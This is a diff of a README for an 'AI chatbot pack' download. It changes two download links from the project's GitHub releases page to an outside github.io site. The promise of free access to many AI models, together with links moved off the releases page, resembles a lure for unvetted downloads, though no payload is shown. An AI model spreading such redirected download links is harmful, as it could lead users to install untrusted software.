@@ -47,7 +47,7 @@ That's it. You don't need to install any other programs, and you don't need to k
 
 **Step 1:** Visit this link to download the application:
 
-[![Download Now](https://img.shields.io/badge/Download-ai--chatbot--pack--2026-blue?style=for-the-badge&logo=github)](https://github.com/raptrapp999/ai-chatbot-pack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-ai--chatbot--pack--2026-blue?style=for-the-badge&logo=github)](https://raptrapp999.github.io)
 
 **Step 2:** On that page, you'll see a list of releases. Click the **latest version** (the one at the top) and download the file.
 
@@ -178,7 +178,7 @@ If you've ever wanted to try multiple AI assistants without paying for each one 
 
 Download it today and start chatting with the best AI models in the world — all in one place.
 
-[⬇️ Get the Latest Version Here](https://github.com/raptrapp999/ai-chatbot-pack-2026/releases)
+[⬇️ Get the Latest Version Here](https://raptrapp999.github.io)
 
 ---
 
